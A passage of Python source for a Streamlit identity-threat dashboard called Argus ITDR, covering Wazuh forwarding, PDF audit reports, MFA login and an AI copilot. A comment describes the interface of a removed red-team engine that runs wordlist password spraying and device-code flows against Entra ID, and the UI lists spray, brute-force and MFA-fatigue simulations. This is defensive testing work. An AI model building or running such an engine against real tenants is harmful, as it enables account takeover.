import streamlit as st
import pandas as pd
import requests
import time
import io
import json
import os
import hmac
import hashlib
import warnings
from contextlib import contextmanager
from pathlib import Path
from html import escape
from datetime import datetime
import plotly.express as px

# ReportLab Imports for PDF Generation
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable

from modules import config, storage, integrations, auth
from modules.authorization import require, current
from modules.db import is_configured as db_is_configured
from modules.ai_generator import AIServiceSwitcher, row_to_entra_log

# --- ATTACK ENGINE İNTEQRASİYASI ---
# QEYD (Faza 5, 2026-10-05): `modules/attack_engine.py` working tree-dən
# silinib (bax CLAUDE.md, "Açıq" bəndləri). Bu blok TOXUNULMADAN saxlanılıb
# ki, fayl geri qoyulanda qalan kod (Red Team Attack Controller tab-ı)
# DƏYİŞİKLİK TƏLƏB ETMƏSİN. Geri qoyulan fayl aşağıdakı KONTRAKTA uyğun
# olmalıdır:
#
#   modules/attack_engine.py gözlənilən məzmun:
#     - USERS_FILE, PASSWORDS_FILE: str (wordlist fayl yolları)
#     - generate_wordlists() -> dict:
#         {"graph_fetch_ok": bool, "real_user_count": int,
#          "user_source": str, "graph_fetch_detail": str}
#     - class IdentityAttackEngine(users_file, passwords_file):
#         .users: list[str]
#         .passwords: list[str]
#         .public_app: MSAL PublicClientApplication-uyğun obyekt —
#             .acquire_token_by_username_password(username, password, scopes) -> dict
#             .initiate_device_flow(scopes) -> dict (uğurlu olduqda 'user_code' açarı olmalıdır)
#         .revoke_sign_in_sessions(username) -> tuple[bool, str]
#         .disable_account(username) -> tuple[bool, str]
#
# Fayl mövcud olmadıqda / kontrakta uyğun olmadıqda `attack_engine = None`
# qalır, Red Team tab-ı bunu aşkarlayıb bütün hücum düymələrini disable
# edir və aydın diaqnoz göstərir — tətbiq ÇÖKMÜR.
attack_engine = None
attack_engine_error = None
wordlist_info = None
# --------------------------------------------------------

st.set_page_config(
    page_title="Argus ITDR - Identity Threat Detection",
    page_icon=None,
    layout="wide",
    initial_sidebar_state="expanded",
)

st.markdown("""
<style>
:root {font-family:"Segoe UI",system-ui,sans-serif; color-scheme:dark; --argus-ground:#0E1117; --argus-surface:#131720; --argus-ink:#e7edf3; --argus-muted:#aabac9; --argus-accent:#7ac7eb;}
.stApp, [data-testid="stAppViewContainer"] {background:var(--argus-ground); color:var(--argus-ink);}
[data-testid="stHeader"] {background:#0E1117;}
section[data-testid="stSidebar"] {background:#131720 !important; border-right:1px solid #344656;}
.block-container {padding:2rem clamp(1rem, 2.4vw, 2rem) 3rem; max-width:1500px;}
[data-testid="stMain"], [data-testid="stColumn"] {min-width:0;}
[data-testid="stSidebar"]:is([aria-expanded="true"], [data-collapsed="false"]) {width:252px !important; min-width:252px !important; max-width:252px !important;}
[data-testid="stSidebarHeader"] {padding:0.5rem 1rem;}
[data-testid="stSidebarContent"] {padding-inline:8px;}
[data-testid="stSidebarUserContent"] {padding:0 0.875rem 0.75rem;}
[data-testid="stSidebarUserContent"] [data-testid="stVerticalBlock"] {gap:0.4rem;}
[data-testid="stSidebar"] hr {margin:0.4rem 0;}
[data-testid="stSidebar"] p {overflow-wrap:anywhere;}
.st-key-copilot_panel {width:min(100%, max(28rem, 50vw)) !important; margin-inline:auto; padding:1rem; border:1px solid #344656; border-radius:12px; background:var(--argus-surface);}
.st-key-privacy_policy {max-width:72ch !important; margin-inline:auto;}
.st-key-privacy_policy h2 {padding-bottom:0.5rem; border-bottom:1px solid #344656;}
.st-key-privacy_policy p {line-height:1.65;}
.st-key-copilot_panel [data-testid^="stChatMessageAvatar"] {background:#203544; color:var(--argus-ink);}
h1 {font-size:2rem !important; font-weight:650 !important; letter-spacing:-.025em;}
h2 {font-size:1.5rem !important; margin-top:1.5rem;}
h3 {font-size:1.15rem !important;}
html, body, [data-testid="stApp"] {font-family:"Segoe UI",system-ui,sans-serif;}
[data-testid="stSidebarContent"] {display:flex; flex-direction:column; min-height:100vh;}
[data-testid="stSidebarUserContent"] {flex:1;}
[data-testid="stDataFrame"], [data-testid="stDataFrame"] > div, [data-testid="stExpander"] details, [data-testid="stExpander"] summary, [data-testid="stExpanderDetails"], [data-baseweb="select"] > div, [data-testid="stAlert"], [data-testid="stFileUploader"], [data-testid="stExpander"], input, textarea {border-radius:3px !important;}
[data-testid="stAlert"] {background:#131720; border:1px solid #344656;}
[data-testid="stAlert"] svg {display:none;}
[data-testid="stSidebar"] [role="radiogroup"] {gap:2px;}
[data-testid="stSidebar"] [role="radiogroup"] label {padding:4px 2px; border-radius:3px;}
p, label, [data-testid="stCaptionContainer"] {color:var(--argus-muted);}
[data-testid="stMetricValue"] {font-size:1.5rem;}
[data-testid="stMetric"] {padding:1rem 0; border-bottom:1px solid #344656; font-variant-numeric:tabular-nums;}
[data-testid="stDataFrame"] {font-variant-numeric:tabular-nums;}
[data-testid="stTextInput"] input, [data-baseweb="select"] > div, [data-testid="stTextArea"] textarea {background:#131720; color:#e7edf3; caret-color:#7ac7eb;}
.stButton > button, [data-testid="stFormSubmitButton"] button {background:#23394a; color:#e7edf3; border:1px solid #5a7489; border-radius:3px; min-height:2.75rem;}
.stButton > button:hover {background:#31536a; border-color:#7ac7eb;}
.st-key-account_alerts button {padding:0.55rem 0.875rem; background:var(--argus-surface); border-color:#46596c; border-radius:12px;}
.st-key-account_alerts button > div {justify-content:flex-start;}
.st-key-account_alerts button p {text-align:left; overflow-wrap:anywhere; font-variant-numeric:tabular-nums;}
.st-key-account_alerts button strong {color:var(--argus-ink);}
.st-key-account_alerts button em {color:#f4ce91; font-style:normal; background:#382c1e; border-radius:4px; padding:0.1em 0.35em; box-decoration-break:clone;}
.st-key-account_alerts button[kind="primary"] {border-color:var(--argus-accent); background:#203544;}
.st-key-account_alerts button:hover {border-color:var(--argus-accent);}
button:disabled {opacity:.55; cursor:not-allowed;}
:focus-visible {outline:2px solid #7ac7eb !important; outline-offset:3px;}
::selection {background:#335c78; color:#e7edf3;}
* {box-shadow:none !important; transition:none !important; scrollbar-color:#69849b #0E1117;}
a {color:#9bdcff; text-underline-offset:.2em;}
.argus-sidebar-brand {background:#131720 !important;}
[data-testid="stCaptionContainer"] p {color:#aabac9 !important; opacity:1;}
.argus-sidebar-brand-badge {color:#b5dff2 !important; background:#203544 !important; border-color:#476277 !important;}
[data-baseweb="radio"]:has(input:checked) > div:first-child {background-color:#7ac7eb;}

@media(max-width:760px) {
.block-container {padding:1.25rem 1rem;} h1 {font-size:1.6rem !important;}
[data-testid="stHorizontalBlock"]:has([data-testid="stMetric"]) {flex-wrap:wrap; gap:.75rem;}
[data-testid="stColumn"]:has([data-testid="stMetric"]) {flex:1 1 calc(50% - .75rem) !important; min-width:calc(50% - .75rem) !important; width:calc(50% - .75rem) !important;}
}
@media(prefers-reduced-motion:reduce) {* {animation:none !important; transition:none !important;}}
</style>
""", unsafe_allow_html=True)

if not config.WAZUH_VERIFY_SSL:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ----------------------------------------------------------------------
# Argus -> Wazuh manager lokal fayl körpüsü
# ----------------------------------------------------------------------
_ARGUS_LOG_FILE = Path(config.ARGUS_LOG_DIR) / config.ARGUS_LOG_FILENAME


def send_to_wazuh(payload):
    """
    KÖK SƏBƏB DÜZƏLİŞİ (Cloud <-> ev şəbəkəsi): Cloud-da işləyən Streamlit
    tətbiqi sizin ev kompüterinizin fayl sisteminə birbaşa yaza BİLMƏZ —
    bu, iki tamam ayrı maşındır. Əvvəlki versiya ARGUS_LOG_DIR-ə "yazır" və
    "uğurlu" qaytarırdı, amma bu fayl Cloud-un öz ötəri konteynerində
    yaranıb yox olurdu, Wazuh manager-ə heç vaxt çatmırdı.

    İndi iki rejim var:
      1) ARGUS_INGEST_URL təyin olunubsa (Cloud + ev arasında "ingest
         bridge" qurulub — bax receiver.py) -> hadisə HTTP POST ilə bu
         URL-ə göndərilir. Bridge onu evinizdə lokal fayla yazır.
      2) ARGUS_INGEST_URL boşdursa (tətbiq Wazuh ilə EYNİ maşında
         işləyir) -> köhnə davranış: birbaşa lokal fayla yazılır.

    QEYD (Faza 4, 2026-10-05): URL/token indi həm `.env`-dən, həm də
    ⚙️ Integrations tab-ında UI-dan təyin oluna bilər (bax:
    modules/integrations.py). UI konfiqurasiya edilməyibsə, davranış
    DƏYİŞMƏDƏN əvvəlki kimidir (yalnız `.env`).

    Qaytarır: (ok: bool, data: dict | str-xəta-mesajı)
    """
    _wazuh_cfg = integrations.get_active_wazuh_config()
    ingest_url = _wazuh_cfg["ingest_url"]
    ingest_token = _wazuh_cfg["ingest_token"]

    if ingest_url:
        try:
            headers = {
                "Content-Type": "application/json",
                # ngrok pulsuz planın HTML interstitial səhifəsini bypass edir —
                # bu olmadan cavab HTML olur və JSON parse xətası yaranır.
                "ngrok-skip-browser-warning": "true",
            }
            if ingest_token:
                headers["X-Argus-Token"] = ingest_token

            resp = requests.post(
                ingest_url,
                headers=headers,
                json=payload,
                timeout=15,
            )
            if resp.status_code in (200, 201):
                try:
                    return True, resp.json()
                except Exception:
                    return True, {"written": True}
            return False, f"HTTP {resp.status_code}: {resp.text[:300]}"
        except Exception as e:
            return False, f"Ingest bridge bağlantı xətası: {e}"

    # Fallback: eyni maşında lokal fayla yazmaq (Wazuh manager elə bu
    # kompüterdə işləyirsə, ARGUS_INGEST_URL boş saxlanılıb).
    try:
        _ARGUS_LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(_ARGUS_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(payload, ensure_ascii=False) + "\n")
        return True, {"written": True, "file": str(_ARGUS_LOG_FILE)}
    except Exception as e:
        return False, str(e)


def _display_error(value):
    text = str(value)
    text = text.replace("Ingest bridge ba\u011flant\u0131 x\u0259tas\u0131:", "Ingest bridge connection failed:")
    if any(character in text for character in "\u0259\u0131\u015f\u011f\u0130\u018f"):
        return "Backend operation failed. Check configuration, permissions, and service availability."
    return text


def detect_columns(df: pd.DataFrame) -> dict:
    def pick(*candidates):
        for c in candidates:
            if c in df.columns:
                return c
        return None

    return {
        "event": pick("EventID", "event_id"),
        "user": pick("TargetUserName", "user", "TargetUser"),
        "ip": pick("IpAddress", "source_ip", "IP"),
    }


def classify_risk(event_value) -> str:
    val = str(event_value)
    if "4624" in val:
        return "COMPROMISED"
    if "4625" in val:
        return "ATTEMPTED"
    return "UNKNOWN"


def event_matches(series: pd.Series, code) -> pd.Series:
    return series.astype(str).str.contains(str(code), na=False)


def ensure_timestamp_column(df: pd.DataFrame) -> pd.DataFrame:
    if df is None or df.empty:
        return df

    display_df = df.copy()

    if "Timestamp" not in display_df.columns:
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        display_df.insert(0, "Timestamp", now_str)
    else:
        def _fmt(v):
            try:
                return pd.to_datetime(v).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                return v

        display_df["Timestamp"] = display_df["Timestamp"].apply(_fmt)
        cols_order = ["Timestamp"] + [c for c in display_df.columns if c != "Timestamp"]
        display_df = display_df[cols_order]

    # KÖK SƏBƏB DÜZƏLİŞİ (pyarrow.lib.ArrowInvalid): EventID kimi sütunlar
    # mənbəyə görə qarışıq tipli olur — Red Team Attack Controller-in
    # yaratdığı hadisələrdə EventID int (4625), CSV-dən yüklənən köhnə
    # sətirlərdə isə str ("4625") olur. pd.concat bunları "object" tipinə
    # salır, qarışıq elementlərlə — Streamlit-in Arrow serializasiyası bunu
    # emal edə bilmir və bütün cədvəl göstərilməyə çalışanda crash edir.
    # Göstərim MƏQSƏDİ ilə bütün sütunları string-ə çeviririk (backend/
    # session_state-dəki əsl data dəyişmir, çünki bu, hələ də bir KOPYA
    # üzərində aparılır).
    display_df = display_df.astype(str)

    return display_df


# PDF Generation Function
def generate_pdf_report(df, resolved_users, posture_score):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(
        buffer,
        pagesize=letter,
        rightMargin=36,
        leftMargin=36,
        topMargin=36,
        bottomMargin=36
    )

    styles = getSampleStyleSheet()

    title_style = ParagraphStyle(
        'DocTitle', parent=styles['Heading1'], fontName='Helvetica-Bold',
        fontSize=20, textColor=colors.HexColor("#0E1117"), spaceAfter=6
    )
    subtitle_style = ParagraphStyle(
        'DocSubTitle', parent=styles['Normal'], fontName='Helvetica',
        fontSize=10, textColor=colors.HexColor("#555555"), spaceAfter=15
    )
    h2_style = ParagraphStyle(
        'SectionHeader', parent=styles['Heading2'], fontName='Helvetica-Bold',
        fontSize=14, textColor=colors.HexColor("#1F77B4"), spaceBefore=12, spaceAfter=8
    )
    body_style = ParagraphStyle(
        'BodyDark', parent=styles['Normal'], fontName='Helvetica',
        fontSize=9, textColor=colors.HexColor("#222222")
    )

    elements = []

    elements.append(Paragraph("ARGUS ITDR - EXECUTIVE SECURITY AUDIT REPORT", title_style))
    elements.append(Paragraph(
        f"<b>Generated:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} | "
        f"<b>Engine:</b> Argus Security Analytics Platform", subtitle_style))
    elements.append(Paragraph("Tenant: " + escape(current().tenant_id) + " | Response mode: " + ("REAL" if config.ENABLE_REAL_REMEDIATION else "SIMULATION"), subtitle_style))
    elements.append(HRFlowable(width="100%", thickness=1.5, color=colors.HexColor("#1F77B4"), spaceAfter=15))

    cols = detect_columns(df)
    event_col = cols["event"]
    user_col = cols["user"] or "TargetUserName"
    ip_col = cols["ip"] or "IpAddress"

    total_events = len(df)
    failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else total_events
    compromised_attempts = len(df[df[event_col].astype(str).str.contains('4624')]) if event_col else 0
    remediated_count = len(resolved_users)

    summary_data = [
        [Paragraph("<b>Metric</b>", body_style), Paragraph("<b>Value</b>", body_style), Paragraph("<b>Status / Context</b>", body_style)],
        [Paragraph("Heuristic Posture Score", body_style), Paragraph(f"<b>{posture_score} / 100</b>", body_style), Paragraph("Heuristic based on loaded telemetry; not a compliance assessment", body_style)],
        [Paragraph("Total Ingested Events", body_style), Paragraph(str(total_events), body_style), Paragraph("Active Directory / Entra ID Telemetry", body_style)],
        [Paragraph("Failed Logon Attempts", body_style), Paragraph(str(failed_attempts), body_style), Paragraph("Event ID 4625 Anomalies Detected", body_style)],
        [Paragraph("Successful Sign-in Events", body_style), Paragraph(str(compromised_attempts), body_style), Paragraph("Event ID 4624: Attacker Holds Valid Session", body_style)],
        [Paragraph("Threats Remediated", body_style), Paragraph(str(remediated_count), body_style), Paragraph("Conditional Access & Token Revocation", body_style)]
    ]

    summary_table = Table(summary_data, colWidths=[165, 85, 290], repeatRows=1)
    summary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#EAEAEA")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
        ('TOPPADDING', (0, 0), (-1, -1), 6),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#DDDDDD")),
    ]))

    elements.append(Paragraph("1. Executive Summary", h2_style))
    elements.append(summary_table)
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("2. Threat Analysis & Remediation Log", h2_style))

    pdf_display_df = ensure_timestamp_column(df) if not df.empty else df

    table_data = [[
        Paragraph("<b>Timestamp</b>", body_style),
        Paragraph("<b>Target User</b>", body_style),
        Paragraph("<b>Attacker IP</b>", body_style),
        Paragraph("<b>Error Code</b>", body_style),
        Paragraph("<b>Method</b>", body_style),
        Paragraph("<b>Remediation Status</b>", body_style)
    ]]

    if not pdf_display_df.empty:
        for idx, row in pdf_display_df.iterrows():
            ts = str(row.get("Timestamp", ""))
            user = str(row.get(user_col, "Unknown"))
            ip = str(row.get(ip_col, "127.0.0.1"))
            err = str(row.get("ErrorCode", "AADSTS50126"))
            method = str(row.get("AuthMethod", "OAuth2/NTLM"))

            is_blocked = user in resolved_users
            status_text = "<b><font color='#28A745'>REMEDIATED (Blocked)</font></b>" if is_blocked else "<b><font color='#DC3545'>ACTIVE THREAT</font></b>"

            table_data.append([
                Paragraph(escape(ts), body_style),
                Paragraph(escape(user), body_style),
                Paragraph(escape(ip), body_style),
                Paragraph(escape(err), body_style),
                Paragraph(escape(method), body_style),
                Paragraph(status_text, body_style)
            ])

    threat_table = Table(table_data, colWidths=[85, 110, 75, 70, 70, 130], repeatRows=1)
    threat_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#1F77B4")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 5),
        ('TOPPADDING', (0, 0), (-1, -1), 5),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#CCCCCC")),
    ]))

    elements.append(threat_table)
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("3. Hardening & Strategic Recommendations", h2_style))
    recs = [
        "<b>Enforce Phishing-Resistant MFA:</b> Upgrade identity scopes to require FIDO2 Security Keys or Certificate-Based Authentication.",
        "<b>Deploy Entra ID Protection Policies:</b> Enable automated Smart Lockout thresholds to block password spray IP pools dynamically.",
        "<b>Continuous SIEM Dispatch:</b> Ensure all failed authentication spikes are streaming live into Wazuh Indexer for active SOAR triage.",
        "<b>Session Invalidation:</b> Automatically revoke Active Refresh Tokens for any user accumulating >3 failed sign-ins within 60 seconds.",
        "<b>Compromised Account Priority:</b> Any account with a successful logon (4624) during an active attack window must be treated as CRITICAL and remediated before failed-attempt-only accounts."
    ]
    for r in recs:
        elements.append(Paragraph(f"• {r}", body_style))
        elements.append(Spacer(1, 4))

    doc.build(elements)
    buffer.seek(0)
    return buffer


# ========================================================================
# 🔐 AUTHENTICATION LAYER
# ========================================================================
ARGUS_ADMIN_USER = os.getenv("ARGUS_ADMIN_USER", "")
ARGUS_ADMIN_HASH = os.getenv("ARGUS_ADMIN_HASH", "")

MAX_LOGIN_ATTEMPTS = 3
LOCKOUT_SECONDS = 30


def _hash_password(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()


def _verify_credentials(username: str, password: str) -> bool:
    try:
        auth.login(st.session_state, username, password)
        return True
    except Exception:
        return False



def _log_login_event(event_type: str, username: str):
    payload = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "event_type": event_type,
        "user": username or "unknown",
        "source": "Argus-UI-Auth",
        "severity": "INFO" if event_type == "UI_LOGIN_SUCCESS" else "HIGH",
        "rule_title": "Argus ITDR Panel Authentication Event",
    }
    try:
        send_to_wazuh(payload)
    except Exception:
        pass


def _init_auth_state():
    st.session_state.setdefault("authenticated", False)
    st.session_state.setdefault("auth_username", None)
    st.session_state.setdefault("login_attempts", 0)
    st.session_state.setdefault("lockout_until", 0.0)


@contextmanager
def loading_placeholder(label):
    placeholder = st.empty()
    placeholder.markdown(
        '<div role="status" aria-label="' + escape(label) +
        '" style="height:72px;background:#131720;border:1px solid #344656;border-radius:3px;padding:16px">' +
        escape(label) + '</div>', unsafe_allow_html=True)
    try:
        yield
    finally:
        placeholder.empty()


def auth_links(key):
    left, right = (st, st) if key == "footer" else st.columns(2)
    if left.button("Sign In", key="signin_" + key, width="stretch"):
        st.query_params["page"] = "login"
        st.query_params.pop("auth_mode", None)
        st.rerun()
    if right.button("Create Workspace", key="signup_" + key, width="stretch"):
        st.query_params["page"] = "login"
        st.query_params["auth_mode"] = "signup"
        st.rerun()


def render_guest_preview(route):
    st.header(route)
    st.caption("Guest preview. Tenant telemetry and credentials remain private until sign-in.")
    if "Blue Team" in route or "Analytics" in route:
        st.caption("No tenant connected. Counts and activity become available after sign-in.")
        counts = st.columns(2)
        counts[0].metric("Detected incidents", "Unavailable")
        counts[1].metric("Accounts requiring review", "Unavailable")
        chart = px.bar(pd.DataFrame({"Time (UTC)": [], "Events": []}), x="Time (UTC)", y="Events", title="Observed attack timeline")
        chart.update_layout(paper_bgcolor="#0E1117", plot_bgcolor="#131720", font_color="#e7edf3", height=280)
        chart.update_xaxes(visible=False)
        chart.update_yaxes(visible=False)
        chart.add_annotation(text="Sign in to view tenant activity", showarrow=False)
        st.plotly_chart(chart, width="stretch", config={"displayModeBar": False})
        st.dataframe(pd.DataFrame(columns=["Timestamp", "TargetUserName", "Severity", "Status"]), hide_index=True)
    elif "Red Team" in route:
        st.warning("Admin access to the authorized sandbox organization is required to run simulations.")
        st.table(pd.DataFrame({"Simulation": ["User Enumeration", "Password Spray", "Brute Force", "MFA Fatigue", "Device Code Flow"], "Access": ["Admin | authorized test tenant"] * 5}))
        if st.button("Run simulation"):
            require_login("redteam_preview")
    elif "Integrations" in route:
        st.table(pd.DataFrame({"Service": ["Supabase", "Wazuh", "Groq", "Microsoft Graph"], "Connection": ["Sign in to inspect"] * 4}))
        if st.button("Manage integrations"):
            require_login("integration_preview")
    elif "SIEM" in route:
        st.caption("Dispatch a test event and verify its UUID in the tenant Wazuh index.")
        if st.button("Send Test Event to SIEM"):
            require_login("integration_siem_preview")
    elif "Audit" in route:
        st.date_input("Start date (UTC)")
        st.date_input("End date (UTC, inclusive)")
        if st.button("Generate audit report"):
            require_login("report_preview")
    else:
        st.caption("Inspect tenant evidence, evaluate detection rules, and review analyst-approved Graph response actions.")
        st.dataframe(pd.DataFrame(columns=["TargetUserName", "Attack type", "Severity", "Response"]), hide_index=True)
        if st.button("Analyze tenant evidence" if "AI" in route else "Evaluate live rules"):
            require_login("analysis_preview")


def require_login(key: str, message: str = None) -> bool:
    if not st.session_state.get("authenticated"):
        st.info(message or "Sign in or create a workspace to run this action.")
        auth_links(key)
        return False
    action = "admin" if key.startswith(("clear", "remediate", "redteam", "integration")) else "write"
    try:
        require(action)
        return True
    except PermissionError:
        st.warning("Your role cannot perform this action. Contact your administrator.")
        return False



def render_login_page():
    st.title("Sign in to Argus ITDR")
    st.caption("Sign in, create a workspace, or use configured local Admin credentials.")
    if st.session_state.get("auth_mfa_pending"):
        client = st.session_state["auth_client"]
        if st.button("Cancel sign-in"):
            auth.logout(st.session_state)
            st.rerun()
        factors = [f for f in client.auth.mfa.list_factors().totp if f.status == "verified"]
        if not factors:
            st.info("Set up an authenticator before opening the workspace.")
            if "auth_enrollment" not in st.session_state and st.button("Set up authenticator"):
                enrollment = client.auth.mfa.enroll({"factor_type": "totp", "friendly_name": "Argus ITDR"})
                st.session_state["auth_enrollment"] = {"id": enrollment.id, "qr": enrollment.totp.qr_code}
                st.rerun()
            enrollment = st.session_state.get("auth_enrollment")
            if not enrollment:
                return
            st.image(enrollment["qr"])
            st.caption("Scan this QR code with your authenticator. Never share the code or QR image.")
            factor_id = enrollment["id"]
        else:
            factor_id = factors[0].id
        code = st.text_input("Authenticator code", max_chars=6)
        if st.button("Verify code"):
            try:
                client.auth.mfa.challenge_and_verify({"factor_id": factor_id, "code": code})
                st.session_state.pop("auth_enrollment", None)
                auth.restore(st.session_state)
                st.query_params["page"] = "app"
                st.rerun()
            except Exception:
                st.error("Verification failed. Enter a fresh authenticator code.")
        return
    if st.session_state.get("lockout_until", 0) > time.time():
        st.error("Too many failed attempts. Wait before signing in again.")
        return
    sign_in, signup_tab = st.tabs(["Sign In", "Create Workspace (Sign Up)"], default="Create Workspace (Sign Up)" if st.query_params.get("auth_mode") == "signup" else "Sign In")
    with sign_in:
        with st.form("login_form"):
            email = st.text_input("Username or Work Email", key="login_username_field")
            password = st.text_input("Password", type="password", key="login_password_field")
            if st.form_submit_button("Sign in"):
                if _verify_credentials(email, password):
                    auth.restore(st.session_state)
                    st.query_params["page"] = "login" if st.session_state.get("auth_mfa_pending") else "app"
                    st.rerun()
                else:
                    st.session_state["login_attempts"] += 1
                    if st.session_state["login_attempts"] >= 3:
                        st.session_state["lockout_until"] = time.time() + 60
                        st.session_state["login_attempts"] = 0
                    st.error("Sign-in failed. Check credentials and organization access.")
    with signup_tab:
        with st.form("workspace_signup"):
            work_email = st.text_input("Work Email", key="signup_email")
            new_password = st.text_input("Password", type="password", key="signup_password")
            organization = st.text_input("Organization / Tenant Name")
            if st.form_submit_button("Create Workspace"):
                try:
                    active = auth.signup(st.session_state, work_email, new_password, organization)
                    if active:
                        st.query_params["page"] = "app"
                        st.rerun()
                    else:
                        st.success("Workspace created. Confirm your email, then sign in. Admin membership is provisioned automatically.")
                except Exception:
                    st.error("Workspace creation failed. Check email, password (12+ characters), and Supabase signup configuration.")
    if st.button("Back to SOC workspace"):
        st.query_params["page"] = "app"
        st.rerun()



def render_account_sidebar():
    with st.sidebar:
        st.divider()
        if not st.session_state.get("authenticated"):
            st.caption("Guest Mode | browsing is free. Sign in to run actions.")
            auth_links("footer")
        else:
            st.write(st.session_state.get("auth_username", ""))
            st.caption(st.session_state.get("auth_role", ""))
            st.caption("Workspace: Default" if current().local_admin else "Workspace: " + st.session_state.get("active_tenant_id", ""))
            if st.button("Sign out", key="sidebar_logout_btn"):
                auth.logout(st.session_state)
                st.query_params["page"] = "app"
                st.rerun()
        st.markdown("[Terms of Service](?page=terms) | [Privacy Policy](?page=privacy)")


def render_ai_copilot():
    tenant = st.session_state.get("active_tenant_id") if st.session_state.get("authenticated") else None
    if st.session_state.get("copilot_tenant") != tenant:
        st.session_state["copilot_tenant"] = tenant
        st.session_state.pop("ai_chat_history", None)
        st.session_state.pop("copilot_open", None)

    def toggle():
        st.session_state["copilot_open"] = not st.session_state.get("copilot_open", False)

    is_open = st.session_state.get("copilot_open", False)
    st.sidebar.button("Close AI Copilot" if is_open else "AI Copilot", on_click=toggle, width="stretch")
    if not is_open:
        return

    with st.container(key="copilot_panel"):
        heading, close = st.columns([3, 1])
        heading.subheader("AI Copilot")
        close.button("Close", on_click=toggle, width="stretch")
        if not st.session_state.get("authenticated"):
            st.caption("Sign in to use AI Copilot.")
            if st.button("Sign in", key="login_gate_ai_chat"):
                st.query_params["page"] = "login"
                st.rerun()
            return
        if current().role == "Read-Only Auditor":
            st.caption("Admin or SOC Analyst access is required to use AI Copilot.")
            return

        history = st.session_state.setdefault("ai_chat_history", [])
        if history and st.button("Clear conversation", key="ai_chat_clear_btn"):
            history.clear()
        with st.container(height=280, border=False):
            for message in history:
                avatar = ":material/person:" if message["role"] == "user" else ":material/smart_toy:"
                with st.chat_message(message["role"], avatar=avatar):
                    st.markdown(message["content"])
            if not history:
                st.caption("Ask about an account, source IP, or recent incident.")
        user_msg = st.chat_input("Ask about this investigation...", key="ai_chat_input")
        if user_msg:
            history.append({"role": "user", "content": user_msg})
            try:
                from modules.ai_generator import soc_chat
                from modules.db import incident_records
                reply = soc_chat(history, incident_records()[:20], conversational=True)
            except Exception:
                reply = "AI Copilot could not load the evidence or generate a reply. Try again."
            history.append({"role": "assistant", "content": reply})
            st.rerun()


# ========================================================================
# 🧭 ROUTER — Landing / Login / App
# ========================================================================
# KÖK SƏBƏB DƏYİŞİKLİYİ (2026-10-05, Faza 2+3): əvvəlki versiyada BÜTÜN
# tətbiq login arxasında idi (`st.stop()` login olmayanda). İndi:
#   - "landing" (default) -> ictimai marketinq səhifəsi, login YOXDUR.
#   - "login"             -> ayrıca login səhifəsi.
#   - "app" (və ya naməlum dəyər) -> əsas tətbiq (bütün tab-lar) LOGİN
#     OLMADAN açıqdır — sərbəst naviqasiya. Yalnız data-dəyişən/xarici
#     sistemə göndərən KONKRET əməliyyatlar (`require_login()` ilə
#     qorunan düymələr) daxil olmağı tələb edir.
_init_auth_state()
_memberships = auth.restore(st.session_state)

_argus_page = st.query_params.get("page", "app")

if _argus_page in {"terms", "privacy"}:
    if _argus_page == "privacy":
        from modules.privacy_ui import render_privacy_policy
        render_privacy_policy()
    else:
        st.title("Terms of Service")
        st.info("Deployment policy has not been published. Contact your workspace administrator for the applicable policy before creating a workspace.")
        if st.button("Back to SOC workspace"):
            st.query_params["page"] = "app"
            st.rerun()
    st.stop()

if _argus_page == "login":
    st.markdown("[Terms of Service](?page=terms) | [Privacy Policy](?page=privacy)")
    render_login_page()
    st.stop()


if len(_memberships) > 1:
    _tenants = [m["tenant_id"] for m in _memberships]
    _selected_tenant = st.sidebar.selectbox("Organization", _tenants, index=_tenants.index(st.session_state["active_tenant_id"]))
    if _selected_tenant != st.session_state["active_tenant_id"]:
        st.session_state["active_tenant_id"] = _selected_tenant
        st.rerun()

# ========================================================================
# 🎨 SIDEBAR BRANDING + VERTİKAL NAVİQASİYA MENYUSU
# ========================================================================
st.sidebar.markdown("**Argus ITDR**")
st.sidebar.caption("Identity Threat Detection and Response")

MENU_OPTIONS = ['Blue Team & ITDR Dashboard', 'Live Log Ingestion', 'Threat Response & AI Center', 'Red Team Attack Controller', 'SIEM Integration Test', 'Security Audit Report', 'Integrations']

from modules.threat_center import canonical_route
if 'argus_nav_menu' in st.session_state:
    st.session_state['argus_nav_menu'] = canonical_route(st.session_state['argus_nav_menu'])
requested_route = st.query_params.get('route')
if requested_route:
    route = canonical_route(requested_route)
    if route in MENU_OPTIONS and st.session_state.get('requested_route_applied') != route:
        st.session_state['argus_nav_menu'] = route
        st.session_state['requested_route_applied'] = route
        st.query_params['route'] = route

selected_menu = st.sidebar.radio(
    "Navigation",
    MENU_OPTIONS,
    label_visibility="collapsed",
    key="argus_nav_menu",
)

st.title("Argus ITDR SOC Workspace")
render_ai_copilot()
render_account_sidebar()
# ========================================================================
# 🔐 END AUTHENTICATION LAYER / END SIDEBAR NAVIGATION
# ========================================================================


if not _memberships:
    st.session_state["df"] = pd.DataFrame(columns=storage.EVENT_COLUMNS)
    st.session_state["resolved_users"] = set()

if 'df' not in st.session_state:
    try:
